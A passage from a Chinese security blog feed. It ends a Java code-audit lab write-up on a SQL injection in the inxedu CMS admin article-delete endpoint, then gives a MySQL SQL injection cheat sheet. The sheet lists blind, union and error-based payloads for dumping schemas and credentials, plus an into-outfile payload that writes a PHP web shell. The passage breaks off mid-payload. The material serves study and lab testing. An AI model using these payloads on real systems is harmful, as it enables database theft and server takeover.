class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>配置阿里镜像源</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span>       </span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220915154833152.png" data-caption="image-20220915154833152"><img src="/../images/Java/sql/image-20220915154833152.png" alt="image-20220915154833152"></a></p><p>将配置的Maven适配到IDEA，<code>File -》 Settings -》 Build,Execution,Deployment -》 Maven</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220915172209445.png" data-caption="image-20220915172209445"><img src="/../images/Java/sql/image-20220915172209445.png" alt="image-20220915172209445"></a></p><p>● IDEA配置JDK,<code>File -》 Project Structure -》 Project -》 Project SDK</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916103927914.png" data-caption="image-20220916103927914"><img src="/../images/Java/sql/image-20220916103927914.png" alt="image-20220916103927914"></a></p><p>● IDEA 添加 pom.xml 文件为 Maven 文件,由于部署环境不一样，我们需先修改 pom.xml 文件部分内容，首先将<code>&lt;systemPath&gt;</code>中的 basedir 修改为 pom.basedir ，共四处</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916221526099.png" data-caption="image-20220916221526099"><img src="/../images/Java/sql/image-20220916221526099.png" alt="image-20220916221526099"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916221711148.png" data-caption="image-20220916221711148"><img src="/../images/Java/sql/image-20220916221711148.png" alt="image-20220916221711148"></a></p><p>添加 plugin 版本号</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916221936799.png" data-caption="image-20220916221936799"><img src="/../images/Java/sql/image-20220916221936799.png" alt="image-20220916221936799"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916222014077.png" data-caption="image-20220916222014077"><img src="/../images/Java/sql/image-20220916222014077.png" alt="image-20220916222014077"></a></p><p>● 导入数据至 <code>MYSQL</code> ,利用 <code>phpstudy</code> 导入程序数据库，注意由于数据库文件中有效时间填写为 <code>0000-00-00 00:00:00</code>，但 <code>timestamp</code> 有效时间在：<code>1970-01-01 00:00:00</code> 到 <code>2037-12-31 23:59:59</code>，所以需要将所有的 <code>0000-00-00 00:00:00</code> 修改为有效时间内，否则导入文件会报错。</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916102933090.png" data-caption="image-20220916102933090"><img src="/../images/Java/sql/image-20220916102933090.png" alt="image-20220916102933090"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916103017494.png" data-caption="image-20220916103017494"><img src="/../images/Java/sql/image-20220916103017494.png" alt="image-20220916103017494"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220917103535006.png" data-caption="image-20220917103535006"><img src="/../images/Java/sql/image-20220917103535006.png" alt="image-20220917103535006"></a></p><p>注意数据库名必须与 <code>src/resources/project.properties</code> 相同，否则网站数据会缺失，按照以下操作避免出现错误</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916230200246.png" data-caption="image-20220916230200246"><img src="/../images/Java/sql/image-20220916230200246.png" alt="image-20220916230200246"></a></p><p>导入数据</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916230305522.png" data-caption="image-20220916230305522"><img src="/../images/Java/sql/image-20220916230305522.png" alt="image-20220916230305522"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916230321871.png" data-caption="image-20220916230321871"><img src="/../images/Java/sql/image-20220916230321871.png" alt="image-20220916230321871"></a></p><p>● 配置inxedu项目信息<code>src/resources/project.properties</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916233026648.png" data-caption="image-20220916233026648"><img src="/../images/Java/sql/image-20220916233026648.png" alt="image-20220916233026648"></a></p><p>● 项目运行前，配置相关 Maven 信息,<code>File-》Project Settings -》Artifacts -》Web Application：Archive -》Empty</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916223854118.png" data-caption="image-20220916223854118"><img src="/../images/Java/sql/image-20220916223854118.png" alt="image-20220916223854118"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916224009296.png" data-caption="image-20220916224009296"><img src="/../images/Java/sql/image-20220916224009296.png" alt="image-20220916224009296"></a></p><p>● 配置 <code>Run/Debug Configurations</code> ，配置 <code>Tomcat</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916223455798.png" data-caption="image-20220916223455798"><img src="/../images/Java/sql/image-20220916223455798.png" alt="image-20220916223455798"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916224207000.png" data-caption="image-20220916224207000"><img src="/../images/Java/sql/image-20220916224207000.png" alt="image-20220916224207000"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916224309538.png" data-caption="image-20220916224309538"><img src="/../images/Java/sql/image-20220916224309538.png" alt="image-20220916224309538"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916224349615.png" data-caption="image-20220916224349615"><img src="/../images/Java/sql/image-20220916224349615.png" alt="image-20220916224349615"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916224407884.png" data-caption="image-20220916224407884"><img src="/../images/Java/sql/image-20220916224407884.png" alt="image-20220916224407884"></a></p><p>配置Maven</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916224841069.png" data-caption="image-20220916224841069"><img src="/../images/Java/sql/image-20220916224841069.png" alt="image-20220916224841069"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916225058940.png" data-caption="image-20220916225058940"><img src="/../images/Java/sql/image-20220916225058940.png" alt="image-20220916225058940"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916231424395.png" data-caption="image-20220916231424395"><img src="/../images/Java/sql/image-20220916231424395.png" alt="image-20220916231424395"></a></p><p>注意，若在过程中出现报错，修改了相关配置，记得 <code>clean &amp;&amp; install</code> 清理一下缓存，否则 Run 会出现错误，网站无法起来。</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916233109842.png" data-caption="image-20220916233109842"><img src="/../images/Java/sql/image-20220916233109842.png" alt="image-20220916233109842"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916232156934.png" data-caption="image-20220916232156934"><img src="/../images/Java/sql/image-20220916232156934.png" alt="image-20220916232156934"></a></p><br/>● 编译运行<p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916224555430.png" data-caption="image-20220916224555430"><img src="/../images/Java/sql/image-20220916224555430.png" alt="image-20220916224555430"></a></p><p>编译成功</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916224631034.png" data-caption="image-20220916224631034"><img src="/../images/Java/sql/image-20220916224631034.png" alt="image-20220916224631034"></a></p><br/>● Run 启动网站，点击右上角运行符号运行，虽然有报错，但不影响运行<p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916233227501.png" data-caption="image-20220916233227501"><img src="/../images/Java/sql/image-20220916233227501.png" alt="image-20220916233227501"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916233245750.png" data-caption="image-20220916233245750"><img src="/../images/Java/sql/image-20220916233245750.png" alt="image-20220916233245750"></a></p><br/><h5 id="3、审计开始"><a href="#3、审计开始" class="headerlink" title="3、审计开始"></a><code>3、审计开始</code></h5><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>| 目录结构            |  作用                                                  || ------------------ | -----------------------------------------------------  || src/main/java      | java的代码目录                                          || src/main/resources | 资源目录，存放一些配置文件，如properties、spring-mvc.xml等 || src/main/webapp    | 传统项目的WebContent目录                                 || target             | 编译后的文件                                             |</pre></td></tr></tbody></table></figure><br/><p>审计代码为 <code>scr</code> 目录下的代码，先查看其 <code>web.xml</code> ,分析其使用了哪些框架。 <code>web.xml</code> 提供了设置初始化参数的功能，开发者会将一些配置信息写到里面去，通读 <code>web.xml</code> 可以了解系统使用的框架等基本信息，有时候开发者还会把账号信息等情况写在里面。</p><p>通过分析，该网站使用了 <code>SSM</code> 框架，即 <code>Spring+Spring Mvc+Mybatis</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916144233146.png" data-caption="image-20220916144233146"><img src="/../images/Java/sql/image-20220916144233146.png" alt="image-20220916144233146"></a></p><p>查看其目录结构</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916144417442.png" data-caption="image-20220916144417442"><img src="/../images/Java/sql/image-20220916144417442.png" alt="image-20220916144417442"></a></p><br/><h5 id="4、审计SQL注入"><a href="#4、审计SQL注入" class="headerlink" title="4、审计SQL注入"></a><code>4、审计SQL注入</code></h5><p>文件清楚看到系统的结构，点开dao文件下的任意文件，看看Mybatis是使用了注解开发还是配置文件开发。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注解开发：即可不使用任何的xml配置文件来开发java web，直接在代码中体现，不需要单独编写xml文件</span><br><span class="line">配置文件开发：编写xml配置文件来映射相应的代码</span><br></pre></td></tr></table></figure></div><p>文件只定义了一些方法，并没有详细的Mybatis的注解，所以该 CMS 使用了 XML 配置方法</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916153458532.png" data-caption="image-20220916153458532"><img src="/../images/Java/sql/image-20220916153458532.png" alt="image-20220916153458532"></a></p><p>寻找 XML 配置文件，XML 配置的映射文件会和 dao 的接口在同层目录下 <code>resource/mybatis/index/article</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916153744387.png" data-caption="image-20220916153744387"><img src="/../images/Java/sql/image-20220916153744387.png" alt="image-20220916153744387"></a></p><p>根据上面的知识点可知，若使用了 <code>$&#123;&#125;</code> 则可能存在 SQL 注入，直接在 XML 配置文件寻找 <code>$</code> 符号，发现<code>deleteArticleByIds</code>使用了 <code>$&#123;&#125;</code>,符合上面知识点 in 参数后注入。</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916155038180.png" data-caption="image-20220916155038180"><img src="/../images/Java/sql/image-20220916155038180.png" alt="image-20220916155038180"></a></p><p>dao文件夹找寻XML配置文件对应映射的 <code>deleteArticleByIds</code> 接口</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916155406997.png" data-caption="image-20220916155406997"><img src="/../images/Java/sql/image-20220916155406997.png" alt="image-20220916155406997"></a></p><p>Ctrl + 鼠标左键选中 <code>deleteArticleByIds</code> 查看代码中哪些类调用了该方法，初步发现代码没有进行过滤处理</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916155943404.png" data-caption="image-20220916155943404"><img src="/../images/Java/sql/image-20220916155943404.png" alt="image-20220916155943404"></a></p><p>跟进代码的 Controller（控制器），选择 <code>deleteArticleByIds</code> ，Ctrl+Alt+H快捷键去查询调用层次，去看Controller的位置</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916160453470.png" data-caption="image-20220916160453470"><img src="/../images/Java/sql/image-20220916160453470.png" alt="image-20220916160453470"></a></p><p>查看 <code>Controller</code> 文件，寻找到目录路径为：<code>/admin/article</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916160956840.png" data-caption="image-20220916160956840"><img src="/../images/Java/sql/image-20220916160956840.png" alt="image-20220916160956840"></a></p><p>查看具体调用位置,位置为：<code>/delete</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916161203467.png" data-caption="image-20220916161203467"><img src="/../images/Java/sql/image-20220916161203467.png" alt="image-20220916161203467"></a></p><p>所以漏洞具体位置为： <code>http://192.168.114.131:82/admin/article/delete</code> , 访问后发现为后台注入，靶场密码为：<code>admin/111111</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220917105051989.png" data-caption="image-20220917105051989"><img src="/../images/Java/sql/image-20220917105051989.png" alt="image-20220917105051989"></a></p><p>再次访问 <code>http://192.168.114.131:82/admin/article/delete</code> 网站页面自动跳转至下面以下链接<br><code>http://192.168.114.131:82/admin/article/showlist? </code>点击删除抓取数据包</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916163457592.png" data-caption="image-20220916163457592"><img src="/../images/Java/sql/image-20220916163457592.png" alt="image-20220916163457592"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916163649650.png" data-caption="image-20220916163649650"><img src="/../images/Java/sql/image-20220916163649650.png" alt="image-20220916163649650"></a></p><p>通过sqlmap成功跑出数据，复现成功</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916164206987.png" data-caption="image-20220916164206987"><img src="/../images/Java/sql/image-20220916164206987.png" alt="image-20220916164206987"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916164227132.png" data-caption="image-20220916164227132"><img src="/../images/Java/sql/image-20220916164227132.png" alt="image-20220916164227132"></a></p><h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>1、数据库名称必须为 <code>demo_inxedu_v2_0_open</code> ,否则会报错<br>2、IDEA 搭建网站中会出现各种报错无法进行下一步操作，当找到解决方案后，记得清理缓存<code>（clean &amp;&amp; install）</code>再 Run，否则会出现网站无法启动的情况<br>3、若 <code>phpstudy</code>创建 <code>demo_inxedu_v2_0_open</code> 数据库提示数据库已存在时，进入root数据库查看是否已经存在这个数据库，然后进行删除,再次导入即可</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><code>https://github.com/j3ers3/Hello-Java-Sec</code><br><code>https://theoyu.top/2022/04/27/Java-Prepstatementared.html</code><br><code>https://www.cnblogs.com/nice0e3/p/13647511.html#0x01-jdbc-%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90</code><br><code>https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727827368&amp;idx=1&amp;sn=765d0835f0069b5145523c31e8229850&amp;mpshare=1&amp;scene=1&amp;srcid=0926a6QC3pGbQ3Pznszb4n2q</code></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java代码审计 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入学习笔记-MYSQL注入</title>
      <link href="/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SQLI(SQL Injection)， SQL注入是因为程序未能正确对用户的输入进行检查，将用户的输入以拼接的方式带入SQL语句，导致了SQL注入的产生。攻击者可通过SQL注入直接获取数据库信息，造成信息泄漏。 </p><h2 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h2><p><code>一、盲注常用函数</code></p><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>length()</td><td>返回字符串的长度，例如可以返回数据库名字的长度</td></tr><tr><td>substr()</td><td>截取字符串,偏移从1开始，非从0开始</td></tr><tr><td>ascii()</td><td>返回字符的ascii码</td></tr><tr><td>sleep(n)</td><td>将程序挂起⼀段时间，n为n秒</td></tr><tr><td>if(expr1,expr2,expr3)</td><td>判断语句 如果第⼀个语句正确就执⾏第⼆个语句如果错误执⾏第三个语句</td></tr><tr><td>mid()</td><td>mid(a,b,c)从位置b开始，截取a字符串的c位</td></tr><tr><td><br/></td><td></td></tr></tbody></table><p><code>二、判断注入点</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>➤ 判断是否存在注入点?id=1' and 1=1 --+(正常页面)?id=1' and 1=2 --+(报错页面，页面无任何回显)<p>➤ 有时候系统会将 1&#x3D;1 过滤掉sql语句，此时可尝试其他数值<br>?id&#x3D;1’ and 1352&#x3D;1352 (正常页面)<br>?id&#x3D;1’ and 1352&#x3D;1452 (报错页面，页面无任何回显)</p><p>1’ AND 4003&#x3D;4003 AND ‘Vvmu’&#x3D;’Vvmu’<br>1’ AND 4302&#x3D;4302 AND ‘kBOZ’ like ‘kBOZ’</p><p>➤ 字符型盲注还需要闭合单引号<br>1’ and ‘1’&#x3D;’1<br>1’ or’1’&#x3D;’2<br></pre></p></td></tr></tbody></table></figure><p><code>三、猜解数据库</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>➤ 猜解数据库名长度1' and length(database())=1 --+# 猜解数据库名长度为1，返回错误页面1' and length(database())=8 --+ # 猜解数据库名长度为8，返回正常页面，即数据库名长度为8<p>➤ 猜解数据库名第一个字符<br>1’ and ascii(substr(database(),1,1))&gt;114 –+# 正确页面，说明数据库名的第⼀个字符的ascii值⼤于 114（大写字母R的ascii值）；<br>1’ and ascii(substr(database(),1,1))&gt;115 –+# 错误页面，说明数据库名的第⼀个字符的ascii值不大于115（大写字母S的ascii值）；<br>1’ and ascii(substr(database(),1,1))&#x3D;115 –+# 显示正确，证明该数据库第一个字符为”S”</p><p>➤ 猜解数据库名第2个字符<br>1’ and ascii(substr(database(),2,1))&gt;100 –+# 正确页面，说明第二个字符ascill值大于100<br>1’ and ascii(substr(database(),2,1))&gt;101 –+# 错误页面，说明第二个ascill值少于101<br>1’ and ascii(substr(database(),2,1))&#x3D;101 –+# 正确页面，第二个字符ascill值为101，对应字符为”e”</p><p>以此类推……直到将8个字符全部猜解成功<br></pre></p></td></tr></tbody></table></figure><p><code>四、猜解数据表</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>➤ 猜解数据库存在多少个数据表1' and (select count(table_name) from information_schema.tables where table_schema=database())=1 --+# 错误页面，说明不是只有一个数据表1' and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+ # 正确页面，说明该数据库存在4个数据表<p>➤ 猜解第一个表长度<br>1’ and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;7 –+# 错误页面，说明第一个表长度不是7<br>1’ and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;10 –+# 正确页面，说明第一个表长度为10</p><p>➤ 若想猜解该数据库的第二个表长度，只需更改为 limit 1，1即可，若猜解第三个表更改为 limit 2,1<br>1’ and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1))&#x3D;8 –+</p><p>以此类推……<br></pre></p></td></tr></tbody></table></figure><p><code>五、猜解表中字段名</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>➤ 猜解一个表中字段数1' and (select count(column_name) from information_schema.columns where table_name='数据表名')=1 --+# 页面错误，说明字段数不为11' and (select count(column_name) from information_schema.columns where table_name='数据表名')=2 --+# 页面正确，说明字段数为2<p>若想猜解该表中的第一个字段名长度，只需添加 limit 1,1即可，若猜解第三个字段名长度添加 limit 2,1<br>?id&#x3D;1’ and length(substr((select column_name from information_schema.columns where table_name&#x3D; ‘数据表名’ limit 1,1),1))&#x3D;5 –+</p><p>➤ 猜解第一个字段名，第一个字符<br>1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D; ‘数据表名’ limit 1,1),1,1))&#x3D;107 –+# 页面错误，说明第一个字段名第一个字符ascill值不为107<br>1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D; ‘数据表名’ limit 1,1),1,1))&#x3D;105 –+# 页面正确，说明第一个字段名第一个字符ascill值为105</p><p>➤ 猜解第一个字段名，第二个字符<br>1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D; ‘数据表名’ limit 1,1),1,1))&#x3D;100 –+# 页面错误，说明第一个字段名，第二个字符ascill值不为100<br>1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D; ‘emails’ limit 1,1),1,1))&#x3D;101 –+   # 页面正确，说明第一个字段名，第二个字符ascill值为101<br></pre></p></td></tr></tbody></table></figure><p><code>六、猜解数据</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>➤ 猜解数据1' and ascii(substr((select 字段名 from 数据库表名 limit 0,1),1,1))=30 --+# 页面错误，第一个数据字符ascill值不为301' and ascii(substr((select 字段名 from 数据表名 limit 0,1),1,1))=49 --+  # 页面正确，第一个数据字符ascill值为49</pre></td></tr></tbody></table></figure><p><code>七、利用字典进行暴力破解</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>➤ 直接猜解数据是否为"admin"1' and (select count(*) from 数据表名 where 字段名 = 'admin') = 1 --+</pre></td></tr></tbody></table></figure><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p><code>第一步：判断注入类型</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>➤ 整形判断，以下语句，若页面有所变化则可能存在整形注入?id=1 and 1=1?id=1 and 1=2<p>➤ 字符型判断，以下语句，若页面有所变化则可能存在字符型注入<br>?id&#x3D;1’ and 1&#x3D;1<br>?id&#x3D;1’ and 1&#x3D;2<br></pre></p></td></tr></tbody></table></figure><p><code>第二步、判断字段数，通过 order by 语句，如果后面输入的数字大于数据库的字段数，页面就会报错，正常若少于字段数则表现为正常页面</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>➤ 整形?id=1 order by 5（页面报错）?id=1 order by 4（页面正常，字段数为4）<p>➤ 字符型<br>?id&#x3D;1’ order by 5（页面报错）<br>?id&#x3D;1’ order by 4（页面正常，字段数为4）<br></pre></p></td></tr></tbody></table></figure><p><code>第三步：判断回显点，通过上一步知道字段数为4，所以在联合查询时必须要对应4个查询点，使用联合查询（union）获取回显点，然后构造语句获取数据库名</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>➤ union select 1,2,3,4 --+<p>➤ union select 1,database(),user(),4 –+<br>如上，当输入第一条语句时，网页出现2,3回显，则在2,3出可构造语句进行联合查询<br></pre></p></td></tr></tbody></table></figure><p><code>第四步：通过在回显点处构造注入代码(在报错页面上进行查询，即?id=1&#39; 、 and 1=2等页面)</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>➤ 查询数据库?id=97 and 1=2 union select 1,2,3,4,database（）,6,7,8,9,10<p>➤ 查找库中的表<br>?id&#x3D;97 and 1&#x3D;2 union select 1,2,3,4,group_concat(‘&lt;br&#x2F;&gt;’,table_name),6,7,8,9,10 from information_schema.tables where table_schema&#x3D;database()</p><p>➤ 查询表中的字段<br>?id&#x3D;97 and 1&#x3D;2 union select 1,2,3,4,group_concat(‘&lt;br&#x2F;&gt;’,column_name),6,7,8,9,10 from information_schema.columns where table_schema&#x3D;’数据库名’ and table_name&#x3D;’表名’</p><p>➤ 查询字段里面的数据<br>?id&#x3D;97 and 1&#x3D;2 union select 1,2,3,4,group_concat(‘&lt;br&#x2F;&gt;’,字段名),6,7,8,9,10 from table_name&#x3D;’表名’</p><p>union select 1,group_concat(字段名),group_concat(字段名) from users（表名）–+</p><p>union+select+1,2,3,4,concat_ws(%27~%27,sclname,sclpx),6,7,8,9,10,11,12+from+shuichuli–+</p><p>-1’ union select 1,(select group_concat(id,0x7c,username,0x7c,password) from users),3–+</p><p>➤ 写入文件<br>?id&#x3D;-1’ union select 1,2,’<?php assert($_POST[less1]);?>‘ into outfile ‘C:&#x2F;less1.php’– s<br></pre></p></td></tr></tbody></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><code>一、当无效输入传递给数据库时，通过触发数据库中的错误来利用基于错误的注入。在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数updatexml(),extractvalue() 当这两个函数在执行时，如果出现xml文档路径错误就会产生报错</code></p><p>1）updatexml()报错注入</p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>➤ 爆破数据库版本?id=1'+updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)%23<p>➤ 爆出数据库及相关信息<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)#</p><p>➤ 爆当前数据库表信息<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1) #</p><p>➤ 爆数据表字段信息<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’数据库名’ and table_name&#x3D;’表名’),0x7e),1) #</p><p>➤ 爆数据库内容<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users需自行修改)),1) #<br></pre></p></td></tr></tbody></table></figure><p>2）extractvalue（）报错注入</p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>➤ 爆破当前数据库信息1' and extractvalue(1,concat(0x5c,(select database())))#<p>➤ 爆破当前数据库表名<br>1’ and extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’数据库名’)))#</p><p>➤ 爆破当前数据库列名<br>1’ and extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’数据表名’)))#</p><p>➤ 爆破当前数据库数据<br>1’ and extractvalue(1,concat(0x5c,( select group_concat(列名,0x3a,列名) from 数据表名)))#<br></pre></p></td></tr></tbody></table></figure><p>3）floor() 报错注入</p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>➤ 爆破数据库版本信息?id=1'+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23<p>➤ 爆破当前用户<br>?id&#x3D;1’+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p><p>➤ 爆破当前使用的数据库<br>?id&#x3D;1’+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p><p>➤ 爆破指定表的字段<br>?id&#x3D;1’ +and(select 1 from(select count(*),concat((select (select 